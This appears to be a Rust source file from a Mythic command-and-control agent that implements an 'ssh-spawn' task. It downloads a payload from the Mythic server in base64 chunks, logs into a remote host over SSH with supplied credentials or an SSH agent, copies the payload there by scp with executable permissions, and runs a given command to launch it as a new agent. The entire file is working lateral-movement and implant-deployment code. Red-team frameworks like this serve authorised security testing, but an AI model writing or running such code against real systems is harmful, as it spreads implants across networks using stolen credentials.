use super::{ssh_authenticate, Credentials};
use crate::agent::AgentTask;
use crate::agent::ContinuedData;
use crate::crypto::base64;
use crate::{mythic_continued, mythic_success};
use serde::Deserialize;
use serde_json::json;
use std::error::Error;
use std::io::prelude::*;
use std::path::Path;
use std::result::Result;
use std::sync::mpsc;

/// Chunk size used for downloading from Mythic
const CHUNK_SIZE: usize = 512000;

/// Arguments from the Mythic ssh-spawn task
#[derive(Debug, Deserialize)]
pub struct SshSpawnArgs {
    /// Credentials to use for authentication
    pub credentials: Credentials,

    /// Host to connect to
    pub host: String,

    /// Port to connect to
    pub port: u32,

    /// Path to upload the payload
    pub path: String,

    /// Command used to execute the payload
    pub exec: String,

    /// Whether to authenticate using the connected ssh agent
    pub agent: bool,

    /// Payload ID from Mythic to download
    pub payload: String,
}

/// Spawns a payload on a machine using SSH
/// * `tx` - Channel for passing messages to Mythic
/// * `rx` - Channel for receiving messages from Mythic
pub fn spawn_payload(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: SshSpawnArgs = serde_json::from_str(&task.parameters)?;

    // Start a new file download requesting the agent to spawn
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": args.payload,
            "chunk_num": 1,
        }),
        "task_id": task.id,
        "user_output": "Uploading payload chunk 1\n",
    }))?;

    // Parse the continued task arguments
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

    // Download and decode the agent
    let mut file_data: Vec<u8> = base64::decode(continued_args.chunk_data.unwrap())?;
    let total_chunks = continued_args.total_chunks.unwrap();

    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": args.payload,
                "chunk_num": chunk_num,
            }),
            "task_id": task.id,
            "user_output": format!("Uploading payload chunk {}/{}\n", chunk_num, total_chunks),
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

        file_data.append(&mut base64::decode(continued_args.chunk_data.unwrap())?);
    }

    // Notify Mythic that the agent was downloaded
    tx.send(mythic_continued!(
        task.id,
        "received",
        "Agent received payload\n"
    ))?;

    // Create the command used to execute the payload
    let shell_cmd = args.exec.to_owned();
    let path = args.path.to_owned();

    // Start the SSH session
    let sess = ssh_authenticate(&args.into())?;

    // Send the agent using scp
    let mut sender = sess.scp_send(Path::new(&path), 0o700, file_data.len() as u64, None)?;
    sender.write_all(&file_data)?;

    // Close the scp channel
    sender.send_eof()?;
    sender.wait_eof()?;
    sender.close()?;
    sender.wait_close()?;

    // Open a channel for executing commands
    let mut channel = sess.channel_session()?;

    // Run the command to spawn the agent
    channel.exec(&shell_cmd)?;

    // Return stdout/stderr of the command
    let mut stdout = String::new();
    channel.read_to_string(&mut stdout)?;

    let mut stderr = String::new();
    channel.stderr().read_to_string(&mut stderr)?;

    channel.close()?;
    channel.wait_close()?;

    // Check if the command ran successfully
    if channel.exit_status()? != 0 {
        return Err(format!("Failed to run agent on system. {}", stderr).into());
    }

    // Notify Mythic that the agent was spawned
    tx.send(mythic_success!(task.id, "Exec command completed"))?;

    Ok(())
}
